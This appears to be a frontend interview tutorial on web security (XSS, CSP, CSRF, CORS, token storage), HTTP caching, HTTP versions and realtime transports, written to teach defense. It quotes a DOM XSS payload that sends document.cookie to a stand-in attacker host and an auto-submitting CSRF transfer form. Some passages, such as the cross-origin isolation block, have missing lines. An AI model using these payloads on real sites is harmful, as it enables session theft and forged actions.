Why interviewers ask this

Security questions are the sharpest senior/mid separator in frontend loops. A mid-level engineer can build features; a senior engineer is trusted not to ship the vulnerability that leaks every user's session. Interviewers probe XSS, CSRF, and CORS because they expose whether you understand the browser's trust model — origins, cookies, and the same-origin policy — or whether you've just been cargo-culting Access-Control-Allow-Origin: * until the error went away. The tell is precision: candidates who can say exactly what a CSP nonce does, exactly which requests trigger a preflight, and exactly what SameSite=Lax still allows, read as engineers who can own an app's security posture. Everything here is defensive: how to protect users and apps, argued with mechanisms, not slogans.

The networking third (caching, HTTP/2/3, WebSockets vs SSE) tests systems thinking — whether you understand the machine between your bundle and the user, which is where most real-world latency and most "works on my machine" bugs live. The UI/UX engineering third (design systems, i18n, dark mode, motion accessibility) probes product maturity at scale: have you built for 40 locales, three brands, and users with vestibular disorders — or only for the happy path? Product-minded startups weight this heavily; FAANG asks it in the "frontend breadth" round. This is the final tutorial: it's wide by design, with tiers telling you where airtight beats aware.

1. XSS & Content Security Policy T1

Cross-site scripting means attacker-controlled JavaScript executes in your origin. That single sentence is why XSS is the worst client-side bug class: once script runs in your origin, the same-origin policy — the browser's entire security model — works for the attacker. They can read the DOM (including anything the user can see), call your APIs with the user's cookies, exfiltrate tokens from localStorage, keylog password fields, and rewrite the page into a phishing form. XSS isn't "an alert box"; it's full account compromise for every user who views the injected content.

DOM XSS is the frontend engineer's special responsibility: the server-side team's escaping and WAF never see it, because the payload travels in the fragment (#… is not even sent to the server) or arrives via postMessage. Think in terms of sources (attacker-influenced inputs: location.*, document.referrer, window.name, postMessage data, storage another page wrote) and sinks (execution points: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval/new Function, setTimeout(string), script.src, a.href with a javascript: URL). 

// DOM XSS in three lines — no server involved:
// URL: https://app.example/#<img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">
const banner = document.querySelector('#banner');
banner.innerHTML = 'Welcome back, ' + decodeURIComponent(location.hash.slice(1)); // sink ← source

What React actually protects — and where it doesn't

JSX interpolation ({userInput}) escapes strings before they become text nodes or attribute values — < becomes &lt;, so injected markup renders as inert text. That kills the classic "echo into HTML" bug class by default, which is a genuinely huge win. But React's escaping covers one context: values rendered as content. Every senior interview asks for the escape hatches:

  • dangerouslySetInnerHTML — the name is the documentation. Any user-influenced string here is DOM XSS. This includes "our CMS returns HTML" and "we render markdown" — markdown renderers emit HTML, and raw-HTML passthrough is often on by default.
  • URL attributes: <a href={userUrl}> with javascript:alert(1) executes on click. Escaping doesn't help — it's a perfectly valid attribute value; the protocol is the attack. React warns on javascript: URLs but you must validate: allowlist http:/https:/mailto: (parse with new URL(), don't regex).
  • Props that reach sinks: spreading unvalidated objects ({...userControlled}) can smuggle dangerouslySetInnerHTML or event handlers into an element.
  • SSR state injection: serializing state into <script>window.__STATE__ = {...}</script> — if the JSON contains </script>, the parser closes your tag early and the rest is attacker HTML. Escape < as \u003C when serializing (serialize-javascript / JSON.stringify + replace).
  • Third-party components and refs: anything that takes an html prop, jQuery-era plugins behind a ref, chart libraries that render labels as HTML.
Saying "React prevents XSS" in an interview is a mid-level answer that invites the follow-up that sinks you. The senior version: "React escapes rendered text by default, which eliminates injection into the content context — but it does nothing for dangerouslySetInnerHTML, javascript: URLs, SSR state serialization, or third-party HTML, so we treat those as the audit surface."

Sanitization: DOMPurify, and escaping vs sanitizing

Two different tools for two different jobs. Escaping makes data inert in a given context (HTML-encode for content, attribute-encode for attributes, \u003C for script contexts) — use it when the data should be text. Sanitizing parses untrusted HTML and strips everything not on an allowlist — use it when the data is supposed to be HTML (rich-text editors, CMS content, markdown output). Never write your own sanitizer; HTML parsing has mutation tricks (mXSS) that defeat naive regex filters. The standard is DOMPurify: 

import DOMPurify from 'dompurify';

function RichText({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href'],           // DOMPurify also strips javascript: URLs by default
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;   // sanitize at the point of use
}

Sanitize at render time (or at least on output), not only on input — data stored years ago predates your current rules, and other write paths (imports, admin tools, older APIs) bypass input filters. The platform is also catching up: the native Sanitizer API (setHTML()) ships this behavior in the browser, worth naming as the direction of travel.

Trusted Types: make the sinks type-check

Trusted Types is the structural fix for DOM XSS: a CSP directive that makes dangerous sinks (innerHTML, script.src, eval…) reject plain strings. Only typed objects created by a named, audited policy are accepted — so instead of hunting hundreds of sinks across your codebase, you audit the two or three policies that are allowed to produce HTML: 

# Response header — enforce:
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify

// Now el.innerHTML = someString throws a TypeError.
// DOMPurify can return TrustedHTML directly:
const clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
el.innerHTML = clean;   // OK — TrustedHTML from the 'dompurify' policy

Rollout reality: run report-only first, fix the violations (often in dependencies), then enforce. Chromium-shipped; other engines have been implementing — pitch it as "eliminates DOM XSS as a bug class in supporting browsers" rather than a universal guarantee.

Content Security Policy

CSP is a response header that tells the browser what is allowed to load and execute on the page. Its core anti-XSS value: a strong policy means that even if markup injection succeeds, the injected script doesn't run — because inline script is banned and the attacker can't produce a valid nonce. Directive vocabulary you should command:

Nonces and strict-dynamic — the modern policy

Allowlist-based CSP (script-src 'self' cdn.example.com) is largely a dead end: research (Google's "CSP Is Dead, Long Live CSP") showed most allowlist policies are bypassable via JSONP endpoints or Angular-style gadgets on the allowed domains. The modern pattern is nonce-based, strict CSP: 

Content-Security-Policy:
  script-src 'nonce-r4nd0mBase64' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  • The server generates a fresh random nonce per response and stamps it on every legitimate <script nonce="…">. Injected scripts don't know the nonce → they don't run. (Nonces must be unpredictable and never reused — a static nonce is no CSP at all.)
  • 'strict-dynamic' says: any script loaded by a nonced script is also trusted. That's how bundlers/loaders that inject <script> chunks keep working without allowlisting every CDN path.
  • The trailing https: 'unsafe-inline' are backwards-compat fallbacks: modern browsers that understand 'strict-dynamic' ignore them; ancient browsers fall back to something functional. Interviewers love this detail.
  • Deploy with Content-Security-Policy-Report-Only first, watch violation reports, then enforce. SPAs with static HTML hosting can't mint per-response nonces — use hashes of the inline bootstrap scripts, or move the nonce-stamping to the edge/CDN function.
Frame CSP correctly: it is defense-in-depth, not the primary defense. The primary defenses are output escaping (React's default), sanitization of intentional HTML (DOMPurify), and URL/protocol validation. CSP is the layer that limits blast radius when one of those fails — and its violation reports double as a production XSS detector. Saying "we'd add CSP so we don't need to sanitize" is the trap answer; each layer covers different failure modes.

2. CSRF T1

Cross-site request forgery: an attacker's page makes the victim's browser send a state-changing request to your app, carrying the victim's credentials — because the browser attaches cookies automatically to requests to your domain no matter which site initiated them. The attacker never sees the response and never learns the cookie; they don't need to. They just need the request to happen: transfer money, change the account email, delete a resource, escalate a role.

Anatomy of the attack

<!-- evil.example — the victim merely visits this page while logged in to bank.example -->
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-acct">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.forms[0].submit();</script>

<!-- GET variant — if your GET endpoints mutate state, an <img> is enough: -->
<img src="https://bank.example/transfer?to=attacker&amount=5000">

Note what the attacker exploits: cross-site form posts and resource loads are allowed by the same-origin policy (SOP restricts reading cross-origin responses, not sending requests — see §3), and the browser's ambient cookie attachment. That's why CSRF specifically targets cookie-authenticated apps. An API authenticated by an Authorization: Bearer … header is inherently CSRF-resistant: the attacker's page cannot make the browser attach that header — attaching custom headers requires JS with fetch, which is governed by CORS, and the attacker can't read the token to attach it anyway.

SameSite cookies — the platform-level fix

ValueCookie sent on cross-site requests?Consequences
SameSite=StrictNeverMaximum CSRF protection — but also: following an emailed link to your app arrives logged-out-looking (no cookie on that top-level navigation). Often used for the "action" cookie in a two-cookie pattern.
SameSite=LaxOnly on top-level navigations with safe methods (GET)The pragmatic default. Blocks cross-site POSTs, iframes, images, fetch — the CSRF vectors — while keeping normal link-following logged in.
SameSite=None; SecureAlways (HTTPS only)Required for legitimate cross-site use: third-party widgets, cross-site iframes, some SSO flows. Secure is mandatory or the cookie is rejected.

Chrome has defaulted unspecified cookies to Lax since 2020 (with a "Lax + POST" 2-minute grace quirk for login flows), and other browsers follow the same direction — so the ambient-cookie world that made CSRF trivial is largely gone by default. Two nuances interviewers fish for:

  • The Lax GET hole: Lax still sends the cookie on top-level GET navigation. If any state-changing endpoint accepts GET (/logout, /approve?id=…, that quick hack from 2019), <a href> or window.location from the attacker's page rides the session. Defense: honor HTTP semantics — GET must be safe/idempotent, mutations require POST/PUT/DELETE.
  • "Site" ≠ "origin": SameSite is scoped to the registrable domain (eTLD+1, plus scheme). app.example.com and evil.example.com are the same site — SameSite gives zero protection against a compromised or attacker-controlled sibling subdomain. Origin-level isolation needs more (see tokens, and __Host- prefixes in §4).

Anti-CSRF tokens

The classical defense, still required for defense-in-depth and for older browsers: prove the request originated from your own UI by including a secret the attacker's page cannot read (SOP blocks them from reading your pages).

  • Synchronizer token: server generates a random token bound to the session, embeds it in the rendered form / exposes it via an endpoint; every mutating request must echo it in a body field or header; server compares against the stored value. Gold standard; needs server-side session state (or signed tokens).
  • Double-submit cookie: stateless variant — server sets a random token as a cookie and requires the same value in a header/body field; attacker can make the cookie be sent but can't read it to copy into the field. Weakness: anyone who can set cookies for the parent domain (subdomain takeover, MITM on an HTTP sibling) can plant a known token — the signed variant (HMAC of session ID) closes this.
  • Custom-header check: require e.g. X-Requested-With or any custom header on mutations. Forms can't set headers; fetch with a custom header becomes preflighted (§3), and your server simply doesn't approve cross-origin preflights. Cheap and effective for JSON APIs — this is why "just require Content-Type: application/json and verify it" is also meaningful (form enctypes can't produce it without a preflight).
  • Origin/Referer validation: modern browsers send Origin or Sec-Fetch-Site on cross-site requests — reject mutations whose Sec-Fetch-Site: cross-site. Fetch-metadata headers are the low-effort modern layer.
"We use JWTs so we're safe from CSRF" is only true if the JWT travels in a header. Teams that put the JWT in a cookie (for SSR or convenience) have rebuilt cookie auth and re-inherited CSRF — the token format is irrelevant; the transport is what matters. Conversely, "we're safe because SameSite" fails on the GET hole, same-site subdomains, and browsers/config you don't control. Ship SameSite=Lax/Strict and a token or header check.
Also know login CSRF (attacker submits their credentials to your login form in the victim's browser, so the victim unknowingly operates inside the attacker's account — searches, saved cards, uploaded documents accrue to the attacker): it's why the login form itself needs CSRF protection, which surprises people because "there's no session yet."

3. CORS T1

You cannot explain CORS without the same-origin policy first, because CORS is not a security wall — it's a controlled relaxation of one.

Same-origin policy, precisely

An origin is the triple scheme + host + port. https://app.example.com, http://app.example.com, https://api.example.com, and https://app.example.com:8443 are four different origins. The SOP's core rule: script running in one origin may not read responses (or reach into documents) from another origin. Note what it does not block:

  • Sending is broadly allowed: form posts, <img>/<script>/<link> loads, and top-level navigations go cross-origin freely (this permissiveness is exactly what CSRF exploits — §2).
  • Embedding is allowed: you can iframe, display an image from, or run a script from another origin — you just can't read the pixels/source cross-origin.
  • What's blocked is reading: fetch() to another origin without CORS gets a network-level error in JS; a cross-origin iframe's DOM is inaccessible.

CORS (Cross-Origin Resource Sharing) is the protocol by which a server opts in to letting specific foreign origins read its responses. The browser enforces; the server declares.

Simple vs preflighted requests — exact triggers

A request is "simple" (sent immediately, no preflight) only if all of these hold:

  • Method is GET, HEAD, or POST;
  • Only CORS-safelisted headers are set manually (Accept, Accept-Language, Content-Language, Content-Type);
  • If Content-Type is set, it is one of application/x-www-form-urlencoded, multipart/form-data, or text/plain — the types an HTML form could always produce.

The design logic: simple requests are exactly what the pre-CORS web could already send (forms, image tags), so allowing them adds no new attack surface. They are still sent to the server — only the response read is blocked without the right headers. Anything beyond that envelope — PUT/DELETE/PATCH, Content-Type: application/json, an Authorization or any custom header — is new capability, so the browser first asks permission with a preflight.

The preflight handshake

── 1. Browser sends OPTIONS (no body, no credentials by default) ──────────
OPTIONS /v1/orders HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization

── 2. Server approves (or the whole thing dies here) ──────────────────────
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400        # cache this verdict — skip preflights for a day (browsers cap it)
Vary: Origin

── 3. Only now does the actual PUT go out; its response ALSO needs ────────
──    Access-Control-Allow-Origin, or the read is blocked. ────────────────

When a preflight fails (missing/mismatched headers, non-2xx, or a redirect — preflights must not redirect), the browser never sends the real request, and JS sees an opaque TypeError: Failed to fetch — deliberately detail-free so probing is harder. The real diagnosis lives in the DevTools Network panel and the console's CORS message.

Credentialed requests — the strict mode

By default, cross-origin fetch sends no cookies. Opting in tightens everything:

fetch('https://api.example.com/me', { credentials: 'include' });

# Server must now respond with ALL of:
Access-Control-Allow-Origin: https://app.example.com   # wildcard * is FORBIDDEN with credentials
Access-Control-Allow-Credentials: true
Vary: Origin
  • No wildcards anywhere in credentials mode: Allow-Origin, Allow-Headers, and Allow-Methods must be explicit values, and the browser refuses *. Rationale: "any site on the internet may read responses carrying the user's session" should never be one config value away.
  • The cookie itself must survive the third-party context: SameSite=None; Secure if app and API are on different sites (different eTLD+1). Subdomains of one registrable domain are the same site, so app.example.com → api.example.com keeps its cookies even with Lax — cross-origin but same-site. Truly cross-site setups need SameSite=None and increasingly collide with third-party-cookie phase-outs — a real argument for the BFF pattern (§4).

Common failure modes (the debugging question)

  • Server echoes Origin blindly with Allow-Credentials: true — functionally equivalent to * with credentials, i.e., every website can read your users' authenticated data. Echo only after validating against an allowlist.
  • Missing Vary: Origin — a CDN/proxy caches the response including its Access-Control-Allow-Origin: https://a.example header, then serves that cached copy to b.example, whose reads now fail (or worse, succeed for the wrong origin). Any origin-dependent CORS response must declare Vary: Origin.
  • Redirects: a preflighted request whose preflight hits a redirect fails outright; and a redirect on the actual request re-runs CORS checks against the new URL — the classic "works locally, fails behind the http→https or trailing-slash redirect."
  • Error responses without CORS headers: the API gateway adds CORS headers on 200s but the error path (4xx/5xx from a different layer) doesn't — so the client can never read the error, and every failure looks like "CORS error" instead of the actual 401. CORS headers must be on every response, including errors.
  • no-cors mode misunderstanding: fetch(url, { mode: 'no-cors' }) doesn't "bypass CORS" — it returns an opaque response: status 0, no body, no headers. It exists for fire-and-forget and caching edge cases, not for reading data.
The framing that lands: CORS protects users, not servers. The server receives simple cross-origin requests regardless; anyone with curl can call your API all day — CORS never enters the picture outside a browser. What CORS prevents is a malicious website using the victim's browser (with its cookies, its intranet position, its IP) to read data as that victim. So: CORS is not your API's auth layer, and "we locked down CORS" says nothing about server-side authorization. Preflights are the browser protecting servers from new-shaped requests old servers never expected — the one server-protecting piece of the design.

4. Token storage & auth patterns T1

"Where do you store the JWT — localStorage or a cookie?" is a near-guaranteed senior question, and it's a trap for one-line answers in either direction. The senior move is to argue the actual threat model, name what each choice concedes, and land on the layered pattern most serious teams converge on.

The localStorage vs cookie argument, done properly

Token in localStorage (sent via header)Session in httpOnly cookie
CSRFImmune — attacker pages can't attach your headerVulnerable by default → needs SameSite + token/header defense (§2)
XSS: token theftExfiltratable — one injected script reads it and ships it off; the attacker then uses it from their own machine, any IP, until expiry — even after the user closes the tab and you patch the bugNot readable by JS (httpOnly) — cannot be exfiltrated
XSS: session ridingAlso possible (the script can just call your API)Possible — injected script calls your API and the cookie rides along ("on-site request forgery")

Works for SSR / first paintAwkward — the server never sees it on document requestsYes — arrives with the HTML request

The honest core of the argument: under XSS, both lose — but they lose differently. With localStorage the attacker gets the credential itself: offline, replayable, persistent beyond the page, sellable. With an httpOnly cookie the attacker gets use of the session while their script runs in a victim's open page — bad, but bounded: no offline replay, nothing durable after the tab closes, and server-side session revocation kills it. "httpOnly doesn't save you from XSS" is true; "therefore the choices are equivalent" is not — exfiltration is strictly worse than riding. That asymmetry, plus the fact that CSRF has a platform-level answer (SameSite) while stolen-readable-storage has none, is why security guidance converges on httpOnly cookies for browser session credentials.

sessionStorage is not a security upgrade over localStorage — same-origin JS reads both; it only narrows lifetime and tab scope. And "we encrypt the token in localStorage" changes nothing: the decryption key lives in the same JS context the attacker's script runs in.

Cookie hardening checklist

Set-Cookie: __Host-session=abc123;
  HttpOnly;          # no JS access — kills exfiltration
  Secure;            # HTTPS only — never on the wire in clear
  SameSite=Lax;      # CSRF baseline (Strict for high-value action cookies)
  Path=/;            # __Host- prefix REQUIRES Secure, Path=/, no Domain attribute:
                     # subdomains can't set or shadow it — locked to this exact host
  Max-Age=1800

The modern SPA pattern: access token in memory, refresh token in a cookie

  • Access token — short-lived (5–15 min), kept in a JS variable/closure (module-scope store), attached as Authorization: Bearer. Never persisted: not localStorage, not a readable cookie. XSS can still grab the in-memory copy while running, but there's nothing durable to steal and a reload clears it.
  • Refresh token — long-lived, in an httpOnly; Secure; SameSite=Strict cookie path-scoped to the refresh endpoint only, so it isn't even sent on normal API calls. On app boot or on a 401, call /auth/refresh; the cookie authenticates it; a fresh access token lands in memory.
  • Rotation + reuse detection: every refresh issues a new refresh token and invalidates the old one. If an already-rotated token is ever presented — someone replayed a stolen copy — the server revokes the entire token family and forces re-login. This is the OAuth 2 security-BCP posture; it turns a stolen refresh token into a detected event.
  • The refresh endpoint is cookie-authenticated, so it needs CSRF defense of its own (SameSite=Strict + origin checks) — a detail interviewers reward.

BFF: the pattern that dissolves the question

A Backend-for-Frontend is a thin server (or edge-function layer) owned by the frontend team, sitting between the SPA and the real APIs. The browser holds only a plain httpOnly session cookie for the BFF; the BFF keeps the OAuth tokens server-side and proxies API calls, attaching tokens itself. Result: no tokens in the browser at all — nothing to exfiltrate; XSS is reduced to session riding; refresh, rotation, and revocation become server-side problems; and first-party same-site cookies sidestep the third-party-cookie phase-out. Cost: an extra hop and a service to run. Interview line: "if the security bar is high, I take token handling out of the browser entirely with a BFF — the best place to store a token in the browser is nowhere."

OAuth 2 / OIDC at interview depth

  • Roles: the user (resource owner) authorizes a client (your SPA) via an authorization server (Auth0/Okta/Google) to access a resource server (API). OAuth is delegated authorization; OIDC layers authentication on top — an id_token (JWT of claims about who signed in, consumed by your app) alongside the access_token (the credential for calling APIs). Don't call APIs with the id_token; don't treat mere possession of an access token as login.
  • Authorization Code + PKCE is the only current-practice browser flow: the app redirects to the auth server carrying code_challenge = SHA-256(code_verifier); the user authenticates there; the auth server redirects back with a short-lived one-time code; the app exchanges code + the original code_verifier for tokens. An attacker who intercepts the redirect can't redeem the code — they lack the verifier. PKCE replaces the client secret a public browser client can never keep.
  • The implicit flow is deprecated — tokens used to come back in the URL fragment, leaking via history, referrers, and logs, with no code-exchange binding. Describing implicit as current practice dates your knowledge by half a decade.

JWT pitfalls (argue both sides)

  • alg confusion, historically: the token declares its own algorithm; naive libraries honored alg: none (unsigned tokens accepted) or let attackers flip RS256→HS256 so the RSA public key got used as the HMAC secret. Modern libraries force you to pin expected algorithms. Enduring lesson: never let attacker input choose how it gets verified.
  • No revocation: a JWT is valid until exp, period. Logout, password change, or account compromise can't invalidate issued tokens without reintroducing server-side state (denylist, token-version claim, or short TTL + rotating refresh) — at which point you've rebuilt sessions with extra steps. This is the strongest "why not JWT-as-session" argument.
  • Readable, and heavy: JWTs are base64url-encoded, not encrypted — whoever holds one reads its claims, so no PII or secrets inside. A fat claims payload rides on every request. And verify iss, aud, exp — not just the signature.
  • Where JWTs shine: stateless service-to-service / API authorization — short-lived, verifiable at the edge with no session-store round trip. The senior answer is placement, not love or hate.
A crisp closing position: "Short-lived access token in memory, rotating refresh token in a path-scoped httpOnly cookie, SameSite everywhere, strict CSP as backstop — and if the threat model justifies it, a BFF so the browser never holds tokens at all. localStorage for tokens is the one option whose worst case has no mitigation."

5. Security headers & platform defenses T2

Beyond CSP, a family of response headers hardens the platform itself. Interviewers use these as a depth probe — you won't recite them all unprompted, but "what security headers would you ship on a new app?" should produce a confident, justified list.

Post-Spectre, browsers gated the sharp-edged APIs — SharedArrayBuffer, high-resolution timers, performance.measureUserAgentSpecificMemory() — behind cross-origin isolation: speculative execution can read anything mapped into your process, and cross-origin content historically shared that process. 

Cross-Origin-Opener-Policy: same-origin    # COOP — sever window references between you and
                                           # cross-origin openers/popups (own browsing-context

                                           # (via CORS or a CORP header)
Cross-Origin-Resource-Policy: same-site    # CORP — a resource declaring who may embed IT

crossOriginIsolated === true   // SharedArrayBuffer & precise timers unlock

Together they guarantee no non-consenting cross-origin data shares my process, so the browser re-enables SharedArrayBuffer." You meet this the day ffmpeg.wasm / SQLite-wasm / multithreaded WASM "randomly" fails — the fix is these headers, and the real migration cost is that every cross-origin image/script you embed now needs CORS or CORP. Caveat: COOP same-origin breaks OAuth popup flows that rely on window.opener; same-origin-allow-popups is the compromise.

SRI only makes sense for pinned, immutable URLs; it's incompatible with auto-updating "latest" CDN links — which is itself an argument for self-hosting and bundling dependencies (fewer connections, no third-party availability dependency, and your CSP stays tight).

Supply chain: the attack surface no header fixes

  • Your real trusted computing base is node_modules: a malicious postinstall script or a compromised maintainer account (event-stream, ua-parser-js, polyfill.io) ships attacker code inside your bundle — inside your origin, past every defense above.
  • Lockfiles are a security control: commit them, install with npm ci in CI (exact, reproducible), and review lockfile diffs — a dependency's resolved URL changing to an unexpected host is a red flag.
  • npm audit stance (a favorite probe): triage, don't worship. Much of the output is dev-time or unreachable-path noise — but "we ignore audit" and "we blindly audit fix --force" are both wrong. Gate CI on high/critical findings in production dependencies, review the rest, prefer provenance/install-script scanners, and delay-adopt brand-new versions — most compromises are caught within days of publish.
  • Fewer dependencies is a security feature: every transitive package is a party you've granted script execution in your users' sessions. The platform (fetch, Intl, structuredClone, URL) has absorbed much of what once justified utility deps.
Auditing an app you just inherited takes an afternoon: header scan (Lighthouse best-practices or an online scanner), dependency + lockfile audit, CSP in report-only mode to surface inline-script reality, then targeted code review of the XSS sinks (§1) and cookie flags (§4). That ordering is itself a good interview answer.

6. HTTP caching T1

Tutorial 17 covered caching from the performance angle; this section makes the header vocabulary itself airtight, because "explain no-cache vs no-store" and "design the caching strategy for a release" are standalone interview questions. Mental model: every cached response is either fresh (age < its lifetime → served instantly, no network) or stale (must be revalidated — a conditional request that costs a round trip but usually not a body).

  • ETag is a content fingerprint (hash, version) — precise, sub-second capable. Last-Modified has 1-second granularity and lies when files are touched without changing. ETag takes precedence when both are present.
  • Gotcha: default ETags in some servers derive from inode/mtime and differ across load-balanced instances, silently breaking revalidation (every check "misses"). Use content-based ETags or drop them in favor of hashed URLs.
  • Weak ETags (W/"…") mean semantic equivalence, not byte equality — fine for revalidation, not for byte-range requests.

Heuristic caching — the silent default

No Cache-Control at all does not mean no caching: if a response has a Last-Modified, browsers may cache it heuristically — commonly ~10% of the time since modification. This is how "we never set cache headers" becomes "some users see week-old JS." Rule: every response should have an explicit cache policy, even if that policy is no-store.

The canonical SPA strategy

# Hashed, immutable build assets — the URL *is* the version:
/assets/app.9f8e7d.js      Cache-Control: public, max-age=31536000, immutable
/assets/chunk.1a2b3c.css   Cache-Control: public, max-age=31536000, immutable

# HTML — the mutable pointer to the immutable graph:
/index.html                Cache-Control: no-cache            # + ETag → cheap 304s
#   …or let the CDN absorb traffic while staying fresh-ish:
/index.html                Cache-Control: max-age=0, s-maxage=300, stale-while-revalidate=60

# Authenticated API JSON:
/api/me                    Cache-Control: private, no-store   # or private, max-age=0 + ETag

# Public API (product catalog):
/api/products              Cache-Control: public, s-maxage=60, stale-while-revalidate=300

Why it works: deploys are atomic — new HTML references new hashes; old assets remain valid for still-open tabs; there is no cache-purge choreography and no "user has new HTML with old JS" window (keep a couple of old builds on the CDN for in-flight sessions). This answer, delivered fluently, is a reliable senior signal.

CDN layers and Vary

  • Requests traverse browser cache → (service worker) → CDN edge → regional/origin shield → origin. Each layer obeys its own directives: s-maxage and stale-while-revalidate live mostly at the CDN; max-age governs the browser. Design them separately — long CDN + zero browser is a legitimate combo (you can purge a CDN; you cannot purge browsers).
  • Vary names the request headers that partition the cache key. Vary: Accept-Encoding (gzip vs brotli copies) is table stakes; Vary: Origin for CORS responses (§3); Vary: Accept-Language if you content-negotiate locales. Varying on Cookie effectively disables shared caching — a common accidental foot-gun.
  • Purge strategies: content-hashed URLs make purging almost unnecessary; for the rest, prefer soft purge (mark stale, revalidate) over hard purge (thundering herd on the origin).
The classic incident: HTML cached with max-age=31536000 (someone applied the asset rule to everything). Users are pinned to a dead build for a year, and you cannot purge their browsers. Immutable caching is for content-addressed URLs only; anything at a stable URL must be no-cache or short-lived. If it ever happens, your only lever is changing the URLs users request (path prefix, service-worker takeover) — much cheaper to never let HTML be long-cached.

7. HTTP/1.1 → HTTP/2 → HTTP/3 T2

The whole arc is one story told three times: head-of-line (HOL) blocking, pushed down a layer at each generation. Tell it that way and the facts organize themselves.

HTTP/1.1 — HOL at the application layer

  • One request at a time per connection (pipelining existed but was broken by intermediaries and never viable). A slow response blocks everything queued behind it on that connection.
  • Browsers compensated with ~6 parallel connections per origin — and the era's folk optimizations were all connection-workarounds: domain sharding (fake extra origins for more connections), sprite sheets, inlining, file concatenation.
  • Headers repeat verbatim on every request — kilobytes of identical cookies and UA strings, uncompressed.

HTTP/2 (2015) — multiplexing, HOL pushed down to TCP

  • Binary framing + streams: one TCP connection carries many concurrent streams; frames interleave; a slow response no longer blocks others at the HTTP layer. The 6-connection limit and the sharding/spriting hacks became anti-patterns overnight (sharding actively hurts: it defeats prioritization and multiplies TLS handshakes).
  • HPACK header compression: static + dynamic tables mean a repeated cookie header costs a few bytes after the first send.
  • Prioritization: streams carry weights/dependencies so the server can send CSS before images — in practice server support was so inconsistent that the scheme was replaced by a simpler priority signal (RFC 9218).
  • Server Push is dead: the marquee feature — pushing assets before the client asks — over-pushed things already in cache, wasted bandwidth, and was barely used correctly; Chrome removed support in 2022. Its use case is served by 103 Early Hints (the origin says "while you wait, preconnect/preload these") — knowing this swap is a strong currency signal.
  • The remaining problem: TCP guarantees in-order delivery of the whole byte stream. Lose one packet and every multiplexed stream stalls until retransmission — TCP-layer HOL blocking. On lossy networks (mobile), H2 can genuinely underperform six H1.1 connections, because one loss now stalls everything.

HTTP/3 (2022) — QUIC, HOL solved at the transport

  • QUIC runs over UDP and reimplements reliability per-stream in user space: streams are independently delivered, so a lost packet stalls only the stream it belonged to. That's the headline fix.
  • Integrated TLS 1.3: transport and crypto handshakes are combined — 1-RTT to first byte for new connections, and 0-RTT resumption lets a returning client send the request in the very first flight. (0-RTT data is replayable → servers must accept only idempotent requests in it; a nice security-networking crossover point.)
  • Connection migration: QUIC connections are identified by connection IDs, not the (IP, port) 4-tuple — walk from Wi-Fi to cellular and the connection survives instead of re-handshaking. Being in user space, QUIC also evolves without waiting for OS kernels.
  • Discovery: browsers learn H3 support via the Alt-Svc header or the HTTPS DNS record; first contact is usually H2, upgrading after.

"Does H2/H3 make bundling obsolete?" — the myth question

No — and interviewers ask precisely to see if you parrot the 2016 take. Multiplexing removed the connection cost of many files, but not the other costs of shipping 2,000 modules individually:

  • Compression efficiency: brotli across one large file exploits cross-module redundancy; 2,000 tiny files compress independently and much worse (shared dictionaries are still niche).
  • Per-request overhead remains: scheduling, prioritization, cache lookups, and — for module graphs — discovery waterfalls: import depth N means N sequential round trips unless you preload the whole graph.
  • What H2/H3 did change: the optimum shifted from "one giant bundle" to a few dozen well-chosen chunks — fine enough for route-level caching (one changed module doesn't invalidate the world), coarse enough to compress and schedule well. That's exactly the code-splitting posture from tutorials 16–17.
TLS basics worth having ready: TLS 1.3 cut the handshake to one round trip and removed the legacy cipher zoo; session resumption (tickets) enables 0-RTT; certificates chain to a trusted CA, which is what the browser padlock actually verifies (identity, then key exchange, then symmetric encryption). One sentence each is the right depth for a frontend loop.

8. WebSockets vs SSE vs polling T2

"Design the realtime layer for X" is a system-design staple, and the senior differentiator is picking the cheapest mechanism that satisfies the data flow — not defaulting to WebSockets because they sound realtime. First question to ask: does the client need to push, or only receive?

The mechanics

  • Short polling: setInterval(fetch). Latency = poll interval; cost = constant requests even when nothing changed. Fine for dashboards refreshing every 30 s; embarrassing for chat.
  • Long polling: the server holds the request open until data exists (or timeout), responds, and the client immediately re-requests. Near-realtime latency over plain HTTP — at the cost of connection churn, and re-sent headers per message.
  • SSE (Server-Sent Events): one long-lived plain HTTP response with Content-Type: text/event-stream; the server writes data: frames forever; the browser's EventSource parses them. Server→client only, text (UTF-8) only.
  • WebSocket: starts as an HTTP GET with Upgrade: websocket + Sec-WebSocket-Key; a 101 Switching Protocols response replaces HTTP framing with a persistent, full-duplex, low-overhead frame protocol (text + binary) on the same TCP connection.

Scaling fan-out — where the design question actually lives

  • Stateful connections change your ops model: a node holding 50k open sockets can't be drained/deployed like a stateless API server. Deploys need connection draining and client resume; autoscaling on CPU misses memory-bound connection counts.
  • Sticky sessions vs shared state: either the LB pins a client to the node that holds its connection state, or (better) nodes are dumb pipes and a pub/sub backplane (Redis, Kafka, NATS) fans messages out: publisher → topic → every node forwards to its subscribed sockets. That sentence is the expected answer to "how does user A's message reach user B on another server?"
  • Resume protocol: reconnects need "what did I miss?" — SSE gives you Last-Event-ID for free if you put sequence IDs on events; on WebSocket you build the equivalent (client sends last-seen cursor on connect, server replays from a buffer).
  • Backpressure: a slow consumer on a fast stream needs coalescing (send latest state, not every delta), buffer caps, or drop-and-resync. Naming backpressure unprompted is a strong senior signal.
  • WebTransport (awareness level): QUIC-native successor territory — multiple independent streams and unreliable datagrams (game state, live media), no TCP HOL. Not yet universal; mention it as "what I'd evaluate for latency-critical binary streams."
